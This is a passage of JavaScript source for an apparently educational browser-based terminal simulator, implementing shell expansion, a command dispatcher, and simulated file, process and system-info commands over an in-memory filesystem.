            if (/^\d+$/.test(start)) {
                // Numeric range
                const startNum = parseInt(start);
                const endNum = parseInt(end);
                const step = startNum <= endNum ? 1 : -1;
                for (let i = startNum; step > 0 ? i <= endNum : i >= endNum; i += step) {
                    expansions.push(prefix + i + suffix);
                }
            } else {
                // Character range
                const startCode = start.charCodeAt(0);
                const endCode = end.charCodeAt(0);
                const step = startCode <= endCode ? 1 : -1;
                for (let i = startCode; step > 0 ? i <= endCode : i >= endCode; i += step) {
                    expansions.push(prefix + String.fromCharCode(i) + suffix);
                }
            }
        } else {
            // Comma-separated list {a,b,c}
            const items = content.split(',');
            for (const item of items) {
                expansions.push(prefix + item + suffix);
            }
        }

        // Recursively expand any remaining braces
        const finalExpansions = [];
        for (const exp of expansions) {
            finalExpansions.push(..._expandBraces(exp));
        }

        return finalExpansions;
    }

    /**
     * Expand subshell expressions $(cmd) and `cmd`
     */
    function _expandSubshell(str) {
        // Match $(command) or `command`
        let result = str;

        // Handle $(command) syntax
        let match;
        while ((match = result.match(/\$\(([^)]+)\)/))) {
            const cmd = match[1];
            const { cmd: command, args } = _parseCommand(cmd);
            const output = _executeCommand(command, args, cmd);
            const textOutput = (output || '').replace(/<[^>]*>/g, '').trim();
            result = result.replace(match[0], textOutput);
        }

        // Handle `command` syntax (backticks)
        while ((match = result.match(/`([^`]+)`/))) {
            const cmd = match[1];
            const { cmd: command, args } = _parseCommand(cmd);
            const output = _executeCommand(command, args, cmd);
            const textOutput = (output || '').replace(/<[^>]*>/g, '').trim();
            result = result.replace(match[0], textOutput);
        }

        return result;
    }

    /**
     * Full argument expansion: braces, vars, globs, subshells
     */
    function _expandArgs(args) {
        let expanded = [];

        for (let arg of args) {
            // First expand subshells
            arg = _expandSubshell(arg);

            // Then expand variables
            arg = _expandVars(arg);

            // Then expand braces
            const braceExpanded = _expandBraces(arg);

            // Then expand globs for each brace expansion
            for (const item of braceExpanded) {
                const globExpanded = _expandGlob(item);
                expanded.push(...globExpanded);
            }
        }

        return expanded;
    }

    function _executeCommand(cmd, args, fullLine) {
        // Check for --help
        if (args.includes('--help') || args.includes('-h')) {
            return _getHelp(cmd);
        }

        // Route to command handler
        switch (cmd) {
            // Navigation
            case 'pwd': return state.currentDir;
            case 'cd': return _cmd_cd(args);
            case 'ls': return _cmd_ls(args);

            // File Operations
            case 'cat': return _cmd_cat(args);
            case 'head': return _cmd_head(args);
            case 'tail': return _cmd_tail(args);
            case 'less':
            case 'more': return _cmd_cat(args);
            case 'touch': return _cmd_touch(args);
            case 'mkdir': return _cmd_mkdir(args);
            case 'rm': return _cmd_rm(args);
            case 'rmdir': return _cmd_rmdir(args);
            case 'cp': return _cmd_cp(args);
            case 'mv': return _cmd_mv(args);
            case 'file': return _cmd_file(args);
            case 'stat': return _cmd_stat(args);

            // Search
            case 'find': return _cmd_find(args);
            case 'grep': return _cmd_grep(args);
            case 'which': return _cmd_which(args);
            case 'whereis': return _cmd_whereis(args);
            case 'locate': return _err('locate: database not available');

            // User Info
            case 'whoami': return currentUser.username;
            case 'id': return _cmd_id(args);
            case 'groups': return _cmd_groups(args);
            case 'who': return `${currentUser.username}  pts/0        Jan 17 09:00 (:0)`;
            case 'w': return _cmd_w();
            case 'users': return currentUser.username;
            case 'last': return _cmd_last();

            // System Info
            case 'uname': return _cmd_uname(args);
            case 'hostname': return config.hostname;
            case 'uptime': return ' 09:30:00 up 1 day,  2:30,  1 user,  load average: 0.15, 0.10, 0.05';
            case 'date': return new Date().toString();
            case 'cal': return _cmd_cal();
            case 'df': return _cmd_df(args);
            case 'du': return _cmd_du(args);
            case 'free': return _cmd_free(args);
            case 'lscpu': return _cmd_lscpu();
            case 'nproc': return '4';
            case 'arch': return 'x86_64';

            // Processes
            case 'ps': return _cmd_ps(args);
            case 'top': return _cmd_top();
            case 'htop': return _err('htop: command not found. Try: sudo apt install htop');
            case 'kill': return _cmd_kill(args);
            case 'killall': return _cmd_killall(args);
            case 'jobs': return _cmd_jobs();
            case 'fg': return _cmd_fg(args);
            case 'bg': return _cmd_bg(args);

            // Text Processing
            case 'echo': return args.join(' ');
            case 'printf': return args.join(' ').replace(/\\n/g, '\n').replace(/\\t/g, '\t');
            case 'wc': return _cmd_wc(args);
            case 'sort': return _cmd_sort(args);
            case 'uniq': return _cmd_uniq(args);
            case 'cut': return _cmd_cut(args);
            case 'tr': return _cmd_tr(args);
            case 'sed': return '<span class="clh-dim">sed: stream editing simulated</span>';
            case 'awk': return '<span class="clh-dim">awk: text processing simulated</span>';

            // Permissions
            case 'chmod': return _cmd_chmod(args);
            case 'chown': return _cmd_chown(args);
            case 'chgrp': return _cmd_chgrp(args);
            case 'umask': return args.length ? null : '0022';

            // Environment
            case 'env':
            case 'printenv': return Object.entries(state.env).map(([k, v]) => `${k}=${v}`).join('\n');
            case 'export': return _cmd_export(args);
            case 'set': return Object.entries(state.env).map(([k, v]) => `${k}=${v}`).join('\n');
            case 'unset': if (args[0]) delete state.env[args[0]]; return null;

            // Help & Docs
            case 'help': return _cmd_help();
            case 'man': return _cmd_man(args);
            case 'info': return _cmd_man(args);
            case 'type': return _cmd_type(args);
            case 'alias': return "ll='ls -la'\nla='ls -A'\nl='ls -CF'";

            // History & Terminal
            case 'history': return state.commandHistory.map((c, i) => `  ${i + 1}  ${c}`).join('\n');
            case 'clear': _clear(); return null;
            case 'reset': _clear(); return null;
            case 'exit':
            case 'logout': return '<span class="clh-dim">logout: cannot exit simulation</span>';

            // Network
            case 'ping': return _cmd_ping(args);
            case 'ifconfig':
            case 'ip': return _cmd_ifconfig();
            case 'netstat':
            case 'ss': return _cmd_netstat();
            case 'curl': return _cmd_curl(args);
            case 'wget': return _cmd_wget(args);
            case 'ssh': return _cmd_ssh(args);
            case 'scp': return _cmd_scp(args);

            // Sudo
            case 'sudo': return _cmd_sudo(args);
            case 'su': return _cmd_su(args);

            // Script Execution
            case 'bash': return _cmd_bash(args);
            case 'sh': return _cmd_bash(args);
            case 'source': return _cmd_bash(['.', ...args]);

            // Advanced
            case 'tree': return _cmd_tree(args);
            case 'tar': return _cmd_tar(args);
            case 'nano': return _cmd_nano(args);
            case 'vim':
            case 'vi': return '<span class="clh-dim">vim: use nano instead in this simulation</span>';
            case 'diff': return _cmd_diff(args);
            case 'systemctl': return _cmd_systemctl(args);
            case 'service': return _cmd_service(args);

            // Misc
            case 'sleep': return `<span class="clh-dim">sleep: waiting ${args[0] || 1} seconds...</span>`;
            case 'true': return null;
            case 'false': return null;
            case 'yes': return 'y\ny\ny\n<span class="clh-dim">[interrupted]</span>';
            case 'seq': return _cmd_seq(args);
            case 'time': return 'real\t0m0.001s\nuser\t0m0.000s\nsys\t0m0.001s';
            case 'ln': return _cmd_ln(args);
            case 'readlink': return '<span class="clh-dim">readlink: would show symlink target</span>';
            case 'basename': return args[0] ? args[0].split('/').pop() : '';
            case 'dirname': return args[0] ? args[0].split('/').slice(0, -1).join('/') || '/' : '.';
            case 'realpath': return _resolvePath(args[0] || '.');

            default:
                // Check for variable assignment
                if (cmd.includes('=')) {
                    const [name, ...vals] = cmd.split('=');
                    state.env[name] = vals.join('=');
                    return null;
                }

                // Check for direct script execution (./script.sh or /path/to/script)
                if (cmd.startsWith('./') || cmd.startsWith('/')) {
                    const scriptPath = _resolvePath(cmd);
                    const scriptNode = state.fs[scriptPath];

                    if (scriptNode) {
                        if (scriptNode.type === 'dir') {
                            return _err(`bash: ${cmd}: Is a directory`);
                        }
                        // Check for execute permission
                        if (!scriptNode.perms || !scriptNode.perms.includes('x')) {
                            return _err(`bash: ${cmd}: Permission denied`);
                        }
                        // Execute the script
                        return _cmd_bash([cmd]);
                    }
                    return _err(`bash: ${cmd}: No such file or directory`);
                }

                return _err(`${cmd}: command not found`);
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // COMMAND IMPLEMENTATIONS (Stubs - to be expanded in later sprints)
    // ═══════════════════════════════════════════════════════════════

    function _cmd_cd(args) {
        let target = args[0] || currentUser.home;
        if (target === '~') target = currentUser.home;
        if (target === '-') target = state.env.OLDPWD || state.currentDir;
        if (target.startsWith('~/')) target = currentUser.home + target.slice(1);

        let newPath = _resolvePath(target);
        let node = state.fs[newPath];

        if (!node) return _err(`cd: ${target}: No such file or directory`);

        // Follow symlinks (up to 10 levels to prevent infinite loops)
        let symlinkCount = 0;
        while (node && node.type === 'symlink' && symlinkCount < 10) {
            const symlinkTarget = node.target;
            newPath = _resolvePath(symlinkTarget);
            node = state.fs[newPath];
            symlinkCount++;
            // If symlink target doesn't exist, give clear error
            if (!node) {
                return _err(`cd: ${target}: Too many levels of symbolic links (target ${symlinkTarget} not found)`);
            }
        }

        if (!node) return _err(`cd: ${target}: No such file or directory`);
        if (node.type === 'symlink') return _err(`cd: ${target}: Too many levels of symbolic links`);
        if (node.type !== 'dir') return _err(`cd: ${target}: Not a directory`);

        // Check execute permission (required to traverse directories)
        if (!_canExecute(node)) {
            return _err(`cd: ${target}: Permission denied`);
        }

        state.env.OLDPWD = state.currentDir;
        state.currentDir = newPath;
        state.env.PWD = newPath;
        _updatePrompt();
        return null;
    }

    function _cmd_ls(args) {
        let showAll = false;
        let longFormat = false;
        let paths = [];

        for (const arg of args) {
            if (arg.startsWith('-')) {
                if (arg.includes('a') || arg.includes('A')) showAll = true;
                if (arg.includes('l')) longFormat = true;
            } else {
                paths.push(arg);
            }
        }

        if (paths.length === 0) paths.push('.');

        const results = [];
        for (const p of paths) {
            const path = _resolvePath(p);
            const node = state.fs[path];

            if (!node) {
                results.push(_err(`ls: cannot access '${p}': No such file or directory`));
                continue;
            }

            if (node.type === 'file') {
                results.push(longFormat ? _formatLsLong(path, node) : path.split('/').pop());
                continue;
            }

            let items = [...(node.children || [])];
            if (showAll) {
                items = ['.', '..', ...items];
            } else {
                items = items.filter(i => !i.startsWith('.'));
            }

            if (longFormat) {
                results.push(`total ${items.length * 4}`);
                for (const item of items) {
                    const itemPath = path === '/' ? `/${item}` : `${path}/${item}`;
                    const itemNode = item === '.' ? node :
                                     item === '..' ? state.fs[path.split('/').slice(0, -1).join('/') || '/'] :
                                     state.fs[itemPath];
                    if (itemNode) {
                        results.push(_formatLsLong(itemPath, itemNode, item));
                    }
                }
            } else {
                const colored = items.map(item => {
                    const itemPath = path === '/' ? `/${item}` : `${path}/${item}`;
                    const itemNode = state.fs[itemPath];
                    if (item === '.' || item === '..') return `<span class="clh-dir">${item}</span>`;
                    if (!itemNode) return item;
                    if (itemNode.type === 'symlink') return `<span class="clh-symlink">${item}@</span>`;
                    if (itemNode.type === 'dir') return `<span class="clh-dir">${item}/</span>`;
                    if (itemNode.perms && itemNode.perms[3] === 'x') return `<span class="clh-exec">${item}*</span>`;
                    return item;
                });
                results.push(colored.join('  '));
            }
        }

        return results.join('\n');
    }

    function _formatLsLong(path, node, displayName = null) {
        const name = displayName || path.split('/').pop() || '/';
        const size = (node.size || 4096).toString().padStart(8);
        const date = 'Jan 17 09:00';
        let coloredName = name;

        if (node.type === 'symlink') {
            coloredName = `<span class="clh-symlink">${name}</span> -> ${node.target}`;
        } else if (node.type === 'dir') {
            coloredName = `<span class="clh-dir">${name}</span>`;
        } else if (node.perms && node.perms[3] === 'x') {
            coloredName = `<span class="clh-exec">${name}</span>`;
        }

        return `${node.perms} 1 ${(node.owner || 'root').padEnd(8)} ${(node.group || 'root').padEnd(8)} ${size} ${date} ${coloredName}`;
    }

    function _cmd_cat(args) {
        if (args.length === 0) return '<span class="clh-dim">cat: reading from stdin (Ctrl+C to exit)</span>';

        const results = [];
        for (const arg of args) {
            if (arg.startsWith('-')) continue;
            const path = _resolvePath(arg);
            const node = state.fs[path];

            if (!node) {
                results.push(_err(`cat: ${arg}: No such file or directory`));
            } else if (node.type === 'dir') {
                results.push(_err(`cat: ${arg}: Is a directory`));
            } else if (!_canRead(node)) {
                results.push(_err(`cat: ${arg}: Permission denied`));
            } else {
                results.push(node.content || '');
            }
        }
        return results.join('\n');
    }

    function _cmd_head(args) {
        let lines = 10;
        let files = [];
        for (let i = 0; i < args.length; i++) {
            if (args[i] === '-n' && args[i + 1]) { lines = parseInt(args[i + 1]); i++; }
            else if (!args[i].startsWith('-')) files.push(args[i]);
        }
        if (files.length === 0) return '<span class="clh-dim">head: reading from stdin</span>';

        const results = [];
        for (const f of files) {
            const path = _resolvePath(f);
            const node = state.fs[path];
            if (!node) results.push(_err(`head: ${f}: No such file`));
            else if (!_canRead(node)) results.push(_err(`head: ${f}: Permission denied`));
            else if (node.content) results.push(node.content.split('\n').slice(0, lines).join('\n'));
        }
        return results.join('\n');
    }

    function _cmd_tail(args) {
        let lines = 10;
        let files = [];
        for (let i = 0; i < args.length; i++) {
            if (args[i] === '-n' && args[i + 1]) { lines = parseInt(args[i + 1]); i++; }
            else if (!args[i].startsWith('-')) files.push(args[i]);
        }
        if (files.length === 0) return '<span class="clh-dim">tail: reading from stdin</span>';

        const results = [];
        for (const f of files) {
            const path = _resolvePath(f);
            const node = state.fs[path];
            if (!node) results.push(_err(`tail: ${f}: No such file`));
            else if (!_canRead(node)) results.push(_err(`tail: ${f}: Permission denied`));
            else if (node.content) results.push(node.content.split('\n').slice(-lines).join('\n'));
        }
        return results.join('\n');
    }

    function _cmd_touch(args) {
        for (const arg of args) {
            if (arg.startsWith('-')) continue;
            const path = _resolvePath(arg);
            if (!state.fs[path]) {
                const parentPath = path.split('/').slice(0, -1).join('/') || '/';
                const fileName = path.split('/').pop();
                const parent = state.fs[parentPath];
                if (!parent) return _err(`touch: cannot touch '${arg}': No such file or directory`);
                if (parent.type !== 'dir') return _err(`touch: cannot touch '${arg}': Not a directory`);

                // Check write permission on parent directory
                if (!_canWrite(parent)) {
                    return _err(`touch: cannot touch '${arg}': Permission denied`);
                }

                state.fs[path] = { type: 'file', perms: '-rw-r--r--', owner: currentUser.username, group: currentUser.username, size: 0, content: '' };
                if (!parent.children.includes(fileName)) parent.children.push(fileName);
            }
        }
        return null;
    }

    function _cmd_mkdir(args) {
        let makeParents = false;
        const dirs = [];
        for (const arg of args) {
            if (arg === '-p') makeParents = true;
            else if (!arg.startsWith('-')) dirs.push(arg);
        }

        for (const dir of dirs) {
            const path = _resolvePath(dir);
            if (state.fs[path]) return _err(`mkdir: cannot create directory '${dir}': File exists`);

            const parentPath = path.split('/').slice(0, -1).join('/') || '/';
            const dirName = path.split('/').pop();
            const parent = state.fs[parentPath];

            if (!parent && !makeParents) return _err(`mkdir: cannot create directory '${dir}': No such file or directory`);

            if (parent && parent.type === 'dir') {
                // Check write permission on parent directory
                if (!_canWrite(parent)) {
                    return _err(`mkdir: cannot create directory '${dir}': Permission denied`);
                }

                state.fs[path] = { type: 'dir', perms: 'drwxr-xr-x', owner: currentUser.username, group: currentUser.username, children: [] };
                if (!parent.children.includes(dirName)) parent.children.push(dirName);
            }
        }
        return null;
    }

    function _cmd_rm(args) {
        let recursive = false, force = false;
        const files = [];
        for (const arg of args) {
            if (arg.startsWith('-')) {
                if (arg.includes('r') || arg.includes('R')) recursive = true;
                if (arg.includes('f')) force = true;
            } else files.push(arg);
        }

        for (const f of files) {
            const path = _resolvePath(f);
            const node = state.fs[path];
            if (!node) { if (!force) return _err(`rm: cannot remove '${f}': No such file or directory`); continue; }
            if (node.type === 'dir' && !recursive) return _err(`rm: cannot remove '${f}': Is a directory`);

            const parentPath = path.split('/').slice(0, -1).join('/') || '/';
            const fileName = path.split('/').pop();
            const parent = state.fs[parentPath];

            // Check write permission on parent directory
            if (!_canWrite(parent)) {
                return _err(`rm: cannot remove '${f}': Permission denied`);
            }

            if (parent && parent.children) parent.children = parent.children.filter(c => c !== fileName);
            delete state.fs[path];
        }
        return null;
    }

    function _cmd_rmdir(args) {
        for (const arg of args) {
            if (arg.startsWith('-')) continue;
            const path = _resolvePath(arg);
            const node = state.fs[path];
            if (!node) return _err(`rmdir: failed to remove '${arg}': No such file or directory`);
            if (node.type !== 'dir') return _err(`rmdir: failed to remove '${arg}': Not a directory`);
            if (node.children && node.children.length > 0) return _err(`rmdir: failed to remove '${arg}': Directory not empty`);

            const parentPath = path.split('/').slice(0, -1).join('/') || '/';
            const dirName = path.split('/').pop();
            const parent = state.fs[parentPath];

            // Check write permission on parent directory
            if (!_canWrite(parent)) {
                return _err(`rmdir: cannot remove '${arg}': Permission denied`);
            }

            if (parent && parent.children) parent.children = parent.children.filter(c => c !== dirName);
            delete state.fs[path];
        }
        return null;
    }

    function _cmd_cp(args) {
        if (args.length < 2) return _err('cp: missing file operand');
        const src = _resolvePath(args[args.length - 2]);
        const dst = _resolvePath(args[args.length - 1]);
        const srcNode = state.fs[src];
        if (!srcNode) return _err(`cp: cannot stat '${args[args.length - 2]}': No such file or directory`);

        // Check read permission on source
        if (!_canRead(srcNode)) {
            return _err(`cp: cannot open '${args[args.length - 2]}' for reading: Permission denied`);
        }

        const dstNode = state.fs[dst];
        let targetPath = dst;
        if (dstNode && dstNode.type === 'dir') targetPath = dst + '/' + src.split('/').pop();

        // Check write permission on destination parent
        const parentPath = targetPath.split('/').slice(0, -1).join('/') || '/';
        const parent = state.fs[parentPath];
        if (!_canWrite(parent)) {
            return _err(`cp: cannot create regular file '${args[args.length - 1]}': Permission denied`);
        }

        state.fs[targetPath] = JSON.parse(JSON.stringify(srcNode));
        // Update owner to current user when copying
        state.fs[targetPath].owner = currentUser.username;
        state.fs[targetPath].group = currentUser.username;
        const fileName = targetPath.split('/').pop();
        if (parent && parent.children && !parent.children.includes(fileName)) parent.children.push(fileName);
        return null;
    }

    function _cmd_mv(args) {
        if (args.length < 2) return _err('mv: missing file operand');

        const src = _resolvePath(args[0]);
        const srcNode = state.fs[src];
        if (!srcNode) return _err(`mv: cannot stat '${args[0]}': No such file or directory`);

        // Check write permission on source parent (to remove from there)
        const srcParent = src.split('/').slice(0, -1).join('/') || '/';
        const srcParentNode = state.fs[srcParent];
        if (!_canWrite(srcParentNode)) {
            return _err(`mv: cannot move '${args[0]}': Permission denied`);
        }

        // Now do the copy part (which checks dest permissions)
        const result = _cmd_cp(args);
        if (result && result.includes('error')) return result;

        const srcName = src.split('/').pop();
        if (srcParentNode && srcParentNode.children) srcParentNode.children = srcParentNode.children.filter(c => c !== srcName);
        delete state.fs[src];
        return null;
    }

    function _cmd_file(args) {
        if (args.length === 0) return _err('file: missing operand');
        return args.map(arg => {
            const path = _resolvePath(arg);
            const node = state.fs[path];
            if (!node) return `${arg}: cannot open (No such file)`;
            if (node.type === 'dir') return `${arg}: directory`;
            if (arg.endsWith('.sh')) return `${arg}: Bourne-Again shell script, ASCII text executable`;
            if (arg.endsWith('.py')) return `${arg}: Python script, ASCII text executable`;
            if (arg.endsWith('.json')) return `${arg}: JSON data`;
            if (arg.endsWith('.html')) return `${arg}: HTML document`;
            return `${arg}: ASCII text`;
        }).join('\n');
    }

    function _cmd_stat(args) {
        if (args.length === 0) return _err('stat: missing operand');
        const path = _resolvePath(args[0]);
        const node = state.fs[path];
        if (!node) return _err(`stat: cannot statx '${args[0]}': No such file or directory`);
        return `  File: ${args[0]}
  Size: ${node.size || 4096}\t\tBlocks: ${Math.ceil((node.size || 4096) / 512)}\t${node.type === 'dir' ? 'directory' : 'regular file'}
Access: (${node.perms})  Uid: (${node.owner === 'root' ? '0' : '1000'}/${node.owner})   Gid: (${node.group === 'root' ? '0' : '1000'}/${node.group})
Access: 2026-01-17 09:00:00.000000000 +0000
Modify: 2026-01-17 09:00:00.000000000 +0000
Change: 2026-01-17 09:00:00.000000000 +0000`;
    }

    function _cmd_find(args) {
        let startPath = '.';
        let namePattern = null;
        let typeFilter = null;

        for (let i = 0; i < args.length; i++) {
            if (args[i] === '-name' && args[i + 1]) { namePattern = args[i + 1].replace(/\*/g, '.*'); i++; }
            else if (args[i] === '-type' && args[i + 1]) { typeFilter = args[i + 1]; i++; }
            else if (!args[i].startsWith('-')) startPath = args[i];
        }

        const basePath = _resolvePath(startPath);
        const results = [];

        for (const [path, node] of Object.entries(state.fs)) {
            if (!path.startsWith(basePath)) continue;
            if (typeFilter) {
                if (typeFilter === 'f' && node.type !== 'file') continue;
                if (typeFilter === 'd' && node.type !== 'dir') continue;
            }
            if (namePattern) {
                const name = path.split('/').pop();
                if (!new RegExp(`^${namePattern}$`).test(name)) continue;
            }
            results.push(path);
        }
        return results.length ? results.join('\n') : '<span class="clh-dim">No matches found</span>';
    }

    function _cmd_grep(args) {
        let ignoreCase = false, showLineNumbers = false, countOnly = false, invertMatch = false;
        let pattern = null;
        const files = [];

        for (let i = 0; i < args.length; i++) {
            const arg = args[i];
            if (arg === '-i') ignoreCase = true;
            else if (arg === '-n') showLineNumbers = true;
            else if (arg === '-c') countOnly = true;
            else if (arg === '-v') invertMatch = true;
            else if (arg.startsWith('-') && arg.length > 1) {
                // Handle combined flags like -ci, -in, -cin
                for (const char of arg.slice(1)) {
                    if (char === 'i') ignoreCase = true;
                    else if (char === 'n') showLineNumbers = true;
                    else if (char === 'c') countOnly = true;
                    else if (char === 'v') invertMatch = true;
                }
            } else if (!pattern) pattern = arg;
            else files.push(arg);
        }

        if (!pattern) return _err('grep: missing pattern');
        if (files.length === 0) return '<span class="clh-dim">grep: reading from stdin</span>';

        const results = [];
        const regex = new RegExp(pattern, ignoreCase ? 'gi' : 'g');

        for (const f of files) {
            const path = _resolvePath(f);
            const node = state.fs[path];
            if (!node || node.type === 'dir' || !node.content) continue;

            const lines = node.content.split('\n');
            let fileMatchCount = 0;

            for (let i = 0; i < lines.length; i++) {
                const isMatch = regex.test(lines[i]);
                regex.lastIndex = 0;

                if (invertMatch ? !isMatch : isMatch) {
                    fileMatchCount++;
                    if (!countOnly) {
                        const prefix = files.length > 1 ? `${f}:` : '';
                        const lineNum = showLineNumbers ? `${i + 1}:` : '';
                        const highlighted = lines[i].replace(regex, '<span class="clh-highlight">$&</span>');
                        results.push(`${prefix}${lineNum}${highlighted}`);
                    }
                }
            }

            if (countOnly) {
                const prefix = files.length > 1 ? `${f}:` : '';
                results.push(`${prefix}${fileMatchCount}`);
            }
        }
        return results.join('\n');
    }

    function _cmd_which(args) {
        const cmds = { ls: '/bin/ls', cat: '/bin/cat', bash: '/bin/bash', grep: '/bin/grep', find: '/usr/bin/find', python3: '/usr/bin/python3', nano: '/usr/bin/nano', ssh: '/usr/bin/ssh', curl: '/usr/bin/curl' };
        return args.map(c => cmds[c] || `${c} not found`).join('\n');
    }

    function _cmd_whereis(args) {
        return args.map(c => `${c}: /usr/bin/${c} /usr/share/man/man1/${c}.1.gz`).join('\n');
    }

    function _cmd_id(args) {
        if (args.includes('-u')) return args.includes('-n') ? currentUser.username : currentUser.uid.toString();
        if (args.includes('-g')) return args.includes('-n') ? currentUser.groups[0].name : currentUser.gid.toString();
        if (args.includes('-G')) return args.includes('-n') ? currentUser.groups.map(g => g.name).join(' ') : currentUser.groups.map(g => g.gid).join(' ');
        const groups = currentUser.groups.map(g => `${g.gid}(${g.name})`).join(',');
        return `uid=${currentUser.uid}(${currentUser.username}) gid=${currentUser.gid}(${currentUser.groups[0].name}) groups=${groups}`;
    }

    function _cmd_groups(args) {
        const user = args[0];

        // If no user specified, return current user's groups
        if (!user) {
            return currentUser.groups.map(g => g.name).join(' ');
        }

        // Look up user in /etc/group file
        const groupFile = state.fs['/etc/group'];
        if (groupFile && groupFile.content) {
            const groups = [];
            const lines = groupFile.content.trim().split('\n');
            for (const line of lines) {
                const parts = line.split(':');
                const groupName = parts[0];
                const members = parts[3] ? parts[3].split(',') : [];
                // User is member if listed in members, or if this is their primary group
                if (members.includes(user) || groupName === user) {
                    groups.push(groupName);
                }
            }
            if (groups.length > 0) {
                return `${user} : ${groups.join(' ')}`;
            }
        }

        // Fallback: check if user matches current user
        if (user === currentUser.username) {
            return `${user} : ${currentUser.groups.map(g => g.name).join(' ')}`;
        }

        return `groups: '${user}': no such user`;
    }

    function _cmd_w() {
        return ` 09:30:00 up 1 day,  2:30,  1 user,  load average: 0.15, 0.10, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
${currentUser.username.padEnd(8)} pts/0    :0               09:00    0.00s  0.05s  0.01s bash`;
    }

    function _cmd_last() {
        return `${currentUser.username.padEnd(8)} pts/0        :0               Jan 17 09:00   still logged in
reboot   system boot  6.1.0-hexworth   Jan 17 06:30   still running

wtmp begins Jan 17 06:30:00 2026`;
    }

    function _cmd_uname(args) {
        if (args.includes('-a')) return `Linux ${config.hostname} 6.1.0-hexworth #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux`;
        if (args.includes('-r')) return '6.1.0-hexworth';
        if (args.includes('-n')) return config.hostname;
        if (args.includes('-m')) return 'x86_64';
        if (args.includes('-s')) return 'Linux';
        return 'Linux';
    }

    function _cmd_cal() {
        const now = new Date();
        return `     January 2026
Su Mo Tu We Th Fr Sa
             1  2  3
 4  5  6  7  8  9 10
11 12 13 14 15 16 17
18 19 20 21 22 23 24
25 26 27 28 29 30 31`;
    }

    function _cmd_df(args) {
        const human = args.includes('-h');
        if (human) {
            return `Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        50G   15G   33G  31% /
/dev/sda2       100G   45G   50G  47% /home
tmpfs           4.0G   12M  4.0G   1% /tmp`;
        }
        return `Filesystem     1K-blocks     Used Available Use% Mounted on
/dev/sda1       52428800 15728640  34603008  31% /
/dev/sda2      104857600 47185920  52428800  47% /home
tmpfs            4194304    12288   4182016   1% /tmp`;
    }

    function _cmd_du(args) {
        const human = args.includes('-h');
        const summary = args.includes('-s');
        let path = args.find(a => !a.startsWith('-')) || '.';
        if (summary) return human ? `24M\t${path}` : `24576\t${path}`;
        return human ? `4.0K\t${path}/Documents\n8.0K\t${path}/Downloads\n24M\t${path}` : `4096\t${path}/Documents\n8192\t${path}/Downloads\n24576\t${path}`;
    }

    function _cmd_free(args) {
        const human = args.includes('-h');
        if (human) {
            return `              total        used        free      shared  buff/cache   available
Mem:          7.8Gi       2.0Gi       4.0Gi       128Mi       1.8Gi       5.5Gi
Swap:         2.0Gi          0B       2.0Gi`;
        }
        return `              total        used        free      shared  buff/cache   available
Mem:        8192000     2048000     4096000      131072     1884000     5632000
Swap:       2097152           0     2097152`;
    }

    function _cmd_lscpu() {
        return `Architecture:            x86_64
CPU op-mode(s):          32-bit, 64-bit
Byte Order:              Little Endian
CPU(s):                  4
On-line CPU(s) list:     0-3
Thread(s) per core:      2
Core(s) per socket:      2
Socket(s):               1
Vendor ID:               GenuineIntel
CPU family:              6
Model name:              Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz
CPU MHz:                 1800.000
L1d cache:               64 KiB
L1i cache:               64 KiB
L2 cache:                512 KiB
L3 cache:                6 MiB`;
    }

    function _cmd_ps(args) {
        const showAll = args.includes('aux') || args.includes('-aux') || args.includes('-ef');
        const lines = [];

        if (args.includes('-ef')) {
            lines.push('UID        PID  PPID  C STIME TTY          TIME CMD');
            for (const p of Object.values(state.processes)) {
                lines.push(`${p.user.padEnd(8)} ${p.pid.toString().padStart(5)}  ${p.ppid.toString().padStart(4)}  0 ${p.start} ?        00:00:00 ${p.cmd}`);
            }
        } else if (showAll) {
            lines.push('USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND');
            for (const p of Object.values(state.processes)) {
                lines.push(`${p.user.padEnd(8)} ${p.pid.toString().padStart(5)} ${p.cpu.toFixed(1).padStart(4)} ${p.mem.toFixed(1).padStart(4)}  12345  1234 ?        ${p.state}    ${p.start}   0:00 ${p.cmd}`);
            }
        } else {
            lines.push('  PID TTY          TIME CMD');
            lines.push('  890 pts/0    00:00:00 bash');
        }
        return lines.join('\n');
    }

    function _cmd_top() {
        return `top - 09:30:00 up 1 day, 2:30, 1 user, load average: 0.15, 0.10, 0.05
Tasks: ${Object.keys(state.processes).length} total, 1 running, ${Object.keys(state.processes).length - 1} sleeping
%Cpu(s):  2.3 us,  1.0 sy,  0.0 ni, 96.5 id,  0.2 wa
MiB Mem:   8000.0 total,   4000.0 free,   2000.0 used,   2000.0 buff/cache
MiB Swap:  2048.0 total,   2048.0 free,      0.0 used,   5500.0 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
    1 root      20   0  168940  11340   8200 S   0.0   0.1   0:02.34 systemd
  234 root      20   0   72308   6124   5200 S   0.0   0.1   0:00.50 sshd
  890 ${currentUser.username.padEnd(8)}  20   0   18520   3940   3200 S   0.0   0.0   0:00.10 bash

<span class="clh-dim">[Press q to exit - simulated]</span>`;
    }

    function _cmd_kill(args) {
        const pid = parseInt(args.find(a => !a.startsWith('-')));
        if (!pid) return _err('kill: missing operand');
        if (!state.processes[pid]) return _err(`kill: (${pid}) - No such process`);
        if (state.processes[pid].user === 'root' && currentUser.username !== 'root') {
            return _err(`kill: (${pid}) - Operation not permitted`);
        }
        delete state.processes[pid];
        return null;
    }

    function _cmd_killall(args) {
        const name = args.find(a => !a.startsWith('-'));
        if (!name) return _err('killall: missing operand');
        let killed = 0;
        for (const [pid, p] of Object.entries(state.processes)) {
            if (p.cmd.includes(name)) {
                if (p.user === 'root' && currentUser.username !== 'root') continue;
                delete state.processes[pid];
                killed++;
            }
        }
        return killed ? null : _err(`killall: ${name}: no process found`);
    }

    function _cmd_jobs() {
        if (state.jobs.length === 0) return '';
        return state.jobs.map((j, idx) => {
            const current = idx === state.jobs.length - 1 ? '+' : (idx === state.jobs.length - 2 ? '-' : ' ');
            return `[${j.id}]${current}  ${j.status.padEnd(10)}  ${j.cmd}`;
        }).join('\n');
    }

    function _cmd_fg(args) {
        if (state.jobs.length === 0) {
            return _err('fg: no current job');
        }

        // Get job by number or use most recent
        let jobIdx = state.jobs.length - 1;
        if (args[0]) {
